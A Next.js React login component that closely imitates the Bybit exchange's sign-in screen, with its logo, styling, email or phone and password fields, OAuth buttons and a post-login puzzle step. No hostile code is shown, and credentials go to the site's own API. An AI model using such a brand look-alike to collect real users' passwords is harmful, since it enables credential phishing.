'use client';

import React, { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';
import { ChevronLeft, Eye, EyeOff, ChevronDown } from 'lucide-react';
import BybitLoader from '@/components/BybitLoader';
import PuzzleModal from '@/components/PuzzleModal';

type LoginStep = 'initial' | 'loading' | 'puzzle' | 'navigating';

export default function HomeLogin() {
  const router = useRouter();
  const [activeTab, setActiveTab] = useState('Email');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [mobileNumber, setMobileNumber] = useState('');
  const [error, setError] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [loginStep, setLoginStep] = useState<LoginStep>('initial');
  const [selectedCountry, setSelectedCountry] = useState({
    name: 'Andorra',
    code: '+376',
    flag: '/flags/andorra.png'
  });

  useEffect(() => {
    if (typeof window !== 'undefined') {
      const storedCountry = localStorage.getItem('selectedCountry');
      if (storedCountry) {
        setSelectedCountry(JSON.parse(storedCountry));
        localStorage.removeItem('selectedCountry');
      }
    }
  }, []);

  const handleGoogleLogin = () => {
    const googleClientId = process.env.NEXT_PUBLIC_GOOGLE_CLIENT_ID;
    const redirectUri = process.env.NEXT_PUBLIC_GOOGLE_REDIRECT_URI;
    
    if (googleClientId && redirectUri) {
      const googleAuthUrl = `https://accounts.google.com/o/oauth2/v2/auth?client_id=${googleClientId}&redirect_uri=${redirectUri}&response_type=code&scope=email profile`;
      window.location.href = googleAuthUrl;
    } else {
      console.error('Google OAuth credentials not configured');
      alert('Google login is not configured. Please add credentials to .env file.');
    }
  };

  const handleTelegramLogin = () => {
    const telegramBotUsername = process.env.NEXT_PUBLIC_TELEGRAM_BOT_USERNAME;
    const telegramRedirectUri = process.env.NEXT_PUBLIC_TELEGRAM_REDIRECT_URI;
    
    if (telegramBotUsername && telegramRedirectUri) {
      const telegramAuthUrl = `https://oauth.telegram.org/auth?bot_id=${telegramBotUsername}&origin=${telegramRedirectUri}&request_access=write`;
      window.location.href = telegramAuthUrl;
    } else {
      console.error('Telegram OAuth credentials not configured');
      alert('Telegram login is not configured. Please add credentials to .env file.');
    }
  };

  const handleLogin = async () => {
    setError('');

    // Validate inputs
    if (activeTab === 'Email') {
      if (!email) {
        setError('Please enter your email');
        return;
      }
      if (!password) {
        setError('Please enter your password');
        return;
      }
    } else {
      if (!mobileNumber) {
        setError('Please enter your mobile number');
        return;
      }
      if (!password) {
        setError('Please enter your password');
        return;
      }
    }

    setIsLoading(true);
    setLoginStep('loading');

    try {
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email: activeTab === 'Email' ? email : `${selectedCountry.code}${mobileNumber}`,
          password,
        }),
      });

      const data = await response.json();

      if (!response.ok) {
        setError(data.error || 'Email and Password is incorrect');
        setLoginStep('initial');
        setIsLoading(false);
        return;
      }

      // Store auth data
      if (data.token) {
        localStorage.setItem('auth_token', data.token);
        localStorage.setItem('user', JSON.stringify(data.user));
      }

      // Show puzzle modal
      setLoginStep('puzzle');
      setIsLoading(false);

    } catch (err) {
      console.error('Login error:', err);
      setError('An error occurred. Please try again.');
      setLoginStep('initial');
      setIsLoading(false);
    }
  };

  const handlePuzzleSuccess = () => {
    setLoginStep('navigating');
    
    // Navigate to dashboard after brief delay
    setTimeout(() => {
      router.push('/BybitDashboard');
    }, 1500);
  };

  const handlePuzzleClose = () => {
    setLoginStep('initial');
  };

  const handleCountryClick = () => {
    router.push('/Country-list');
  };

  // Show loader
  if (loginStep === 'loading' || loginStep === 'navigating') {
    return <BybitLoader fullScreen />;
  }

  // Show puzzle modal
  if (loginStep === 'puzzle') {
    return (
      <>
        <div className="min-h-screen bg-[#1a1a1a] text-white flex flex-col">
          {/* Header */}
          <div className="flex items-center justify-between px-4 py-4">
            <button 
              onClick={() => setLoginStep('initial')}
              className="p-2 hover:bg-[#2a2a2a] rounded-lg transition"
            >
              <ChevronLeft className="w-6 h-6 text-gray-400" />
            </button>
            
            <button 
              onClick={() => router.push('/Home-Signup')}
              className="text-yellow-500 font-medium text-sm"
            >
              Sign Up
            </button>
          </div>

          {/* Logo Section */}
          <div className="flex flex-col items-center justify-center px-6 pt-8 pb-16">
            <div className="mb-8">
              <div className="flex items-center justify-center gap-1">
                <span className="text-5xl font-bold text-white tracking-tight">BYB</span>
                <div className="w-1 h-12 bg-yellow-500 rounded-full"></div>
                <span className="text-5xl font-bold text-white tracking-tight">T</span>
              </div>
            </div>
          </div>

          {/* Login Form Container */}
          <div className="flex-1 bg-[#0a0a0a] rounded-t-3xl px-6 pt-8">
            <p className="text-center text-gray-400">Verifying your identity...</p>
          </div>
        </div>

        {/* Puzzle Modal */}
        <PuzzleModal
          isOpen={true}
          onClose={handlePuzzleClose}
          onSuccess={handlePuzzleSuccess}
        />
      </>
    );
  }

  return (
    <div className="min-h-screen bg-[#1a1a1a] text-white flex flex-col">
      {/* Header */}
      <div className="flex items-center justify-between px-4 py-4">
        <button 
          onClick={() => router.back()}
          className="p-2 hover:bg-[#2a2a2a] rounded-lg transition"
        >
          <ChevronLeft className="w-6 h-6 text-gray-400" />
        </button>
        
        <button 
          onClick={() => router.push('/Home-Register-Account')}
          className="text-yellow-500 font-medium text-sm"
        >
          Sign Up
        </button>
      </div>

      {/* Logo Section */}
      <div className="flex flex-col items-center justify-center px-6 pt-8 pb-16">
        <div className="mb-8">
          <div className="flex items-center justify-center gap-1">
            <span className="text-5xl font-bold text-white tracking-tight">BYB</span>
            <div className="w-1 h-12 bg-yellow-500 rounded-full"></div>
            <span className="text-5xl font-bold text-white tracking-tight">T</span>
          </div>
        </div>
      </div>

      {/* Login Form Container */}
      <div className="flex-1 bg-[#0a0a0a] rounded-t-3xl px-6 pt-8">
        {/* Tabs */}
        <div className="flex gap-8 mb-6">
          <button
            onClick={() => {
              setActiveTab('Email');
              setError('');
            }}
            className={`text-base font-medium pb-2 transition-colors relative ${
              activeTab === 'Email' ? 'text-white' : 'text-gray-500'
            }`}
          >
            Email
            {activeTab === 'Email' && (
              <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-yellow-500"></div>
            )}
          </button>
          
          <button
            onClick={() => {
              setActiveTab('Mobile Number');
              setError('');
            }}
            className={`text-base font-medium pb-2 transition-colors relative ${
              activeTab === 'Mobile Number' ? 'text-white' : 'text-gray-500'
            }`}
          >
            Mobile Number
            {activeTab === 'Mobile Number' && (
              <div className="absolute bottom-0 left-0 right-0 h-0.5 bg-yellow-500"></div>
            )}
          </button>
        </div>

        {/* Error Message */}
        {error && (
          <div className="mb-4 p-3 bg-red-500/10 border border-red-500/30 rounded-lg">
            <p className="text-red-500 text-sm text-center">{error}</p>
          </div>
        )}

        {/* Form */}
        <div className="space-y-4">
          {activeTab === 'Email' ? (
            <>
              {/* Email Input */}
              <div>
                <div className="relative bg-transparent border border-gray-700 rounded-lg overflow-hidden">
                  <div className="absolute left-4 top-1/2 -translate-y-1/2">
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="text-gray-500">
                      <rect x="3" y="5" width="18" height="14" rx="2" />
                      <path d="M3 7l9 6 9-6" />
                    </svg>
                  </div>
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => {
                      setEmail(e.target.value);
                      setError('');
                    }}
                    placeholder="Email"
                    className="w-full bg-transparent text-white pl-12 pr-4 py-4 focus:outline-none focus:ring-1 focus:ring-yellow-500 placeholder-gray-600"
                  />
                  <div className="absolute left-12 top-1/2 -translate-y-1/2 w-0.5 h-6 bg-yellow-500"></div>
                </div>
              </div>
            </>
          ) : (
            <>
              {/* Mobile Number Input with Country Selector */}
              <div>
                <div className="relative bg-transparent border border-gray-700 rounded-lg overflow-hidden flex">
                  {/* Country Code Selector */}
                  <button
                    type="button"
                    onClick={handleCountryClick}
                    className="flex items-center gap-2 px-4 py-4 hover:bg-[#1a1a1a] transition border-r border-gray-700"
                  >
                    <img
                      src={selectedCountry.flag}
                      alt={selectedCountry.name}
                      className="w-6 h-6 rounded-full object-cover"
                      onError={(e) => {
                        const target = e.target as HTMLImageElement;
                        target.src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"><rect fill="%23333" width="24" height="24"/></svg>';
                      }}
                    />
                    <span className="text-white font-medium">{selectedCountry.code}</span>
                    <ChevronDown className="w-4 h-4 text-gray-400" />
                  </button>

                  {/* Phone Number Input */}
                  <input
                    type="tel"
                    value={mobileNumber}
                    onChange={(e) => {
                      setMobileNumber(e.target.value);
                      setError('');
                    }}
                    placeholder="Mobile Number"
                    className="flex-1 bg-transparent text-white px-4 py-4 focus:outline-none focus:ring-1 focus:ring-yellow-500 placeholder-gray-600"
                  />
                </div>
              </div>
            </>
          )}

          {/* Password Input */}
          <div>
            <div className="relative bg-transparent border border-gray-700 rounded-lg overflow-hidden">
              <div className="absolute left-4 top-1/2 -translate-y-1/2">
                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" className="text-gray-500">
                  <rect x="5" y="11" width="14" height="10" rx="2" />
                  <path d="M12 17a1 1 0 1 0 0-2 1 1 0 0 0 0 2z" />
                  <path d="M8 11V7a4 4 0 0 1 8 0v4" />
                </svg>
              </div>
              <input
                type={showPassword ? 'text' : 'password'}
                value={password}
                onChange={(e) => {
                  setPassword(e.target.value);
                  setError('');
                }}
                placeholder="Password"
                className="w-full bg-transparent text-white pl-12 pr-12 py-4 focus:outline-none focus:ring-1 focus:ring-yellow-500 placeholder-gray-600"
              />
              <button
                type="button"
                onClick={() => setShowPassword(!showPassword)}
                className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-400"
              >
                {showPassword ? (
                  <EyeOff className="w-5 h-5" />
                ) : (
                  <Eye className="w-5 h-5" />
                )}
              </button>
            </div>
          </div>

          {/* Forgot Password Link */}
          <div className="flex justify-end">
            <button
              type="button"
              className="text-yellow-500 text-sm hover:text-yellow-400"
            >
              Having trouble logging in?
            </button>
          </div>

          {/* Login Button */}
          <button
            onClick={handleLogin}
            disabled={isLoading}
            className="w-full bg-gradient-to-r from-yellow-600 to-yellow-700 hover:from-yellow-700 hover:to-yellow-800 text-white font-semibold py-4 rounded-lg transition shadow-lg disabled:opacity-50"
          >
            {isLoading ? (
              <div className="flex items-center justify-center gap-2">
                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                <span>Logging in...</span>
              </div>
            ) : (
              'Login Now'
            )}
          </button>
        </div>

        {/* Divider */}
        <div className="flex items-center gap-4 my-6">
          <div className="flex-1 h-px bg-gray-800"></div>
          <span className="text-gray-500 text-sm">Or go with</span>
          <div className="flex-1 h-px bg-gray-800"></div>
        </div>

        {/* Social Login Buttons */}
        <div className="flex items-center justify-center gap-4 mb-8">
          {/* Google Button */}
          <button
            onClick={handleGoogleLogin}
            className="flex items-center justify-center gap-2 bg-[#1a1a1a] hover:bg-[#2a2a2a] border border-gray-800 rounded-full px-6 py-3 transition"
          >
            <svg width="20" height="20" viewBox="0 0 24 24">
              <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
              <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
              <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
              <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
            </svg>
            <span className="text-white font-medium">Google</span>
          </button>

          {/* Telegram Button */}
          <button
            onClick={handleTelegramLogin}
            className="flex items-center justify-center gap-2 bg-[#1a1a1a] hover:bg-[#2a2a2a] border border-gray-800 rounded-full px-6 py-3 transition"
          >
            <svg width="20" height="20" viewBox="0 0 24 24" fill="#229ED9">
              <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.295-.6.295-.002 0-.003 0-.005 0l.213-3.054 5.56-5.022c.24-.213-.054-.334-.373-.121l-6.869 4.326-2.96-.924c-.64-.203-.654-.64.135-.954l11.566-4.458c.538-.196 1.006.128.832.941z"/>
            </svg>
            <span className="text-white font-medium">Telegram</span>
          </button>
        </div>

        {/* Subaccount Login */}
        <div className="flex items-center justify-center mb-8">
          <button className="flex items-center gap-2 text-white text-sm hover:text-gray-300">
            <span>Log in with Subaccount</span>
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
              <path d="M5 12h14M12 5l7 7-7 7"/>
            </svg>
          </button>
        </div>
      </div>
    </div>
  );
}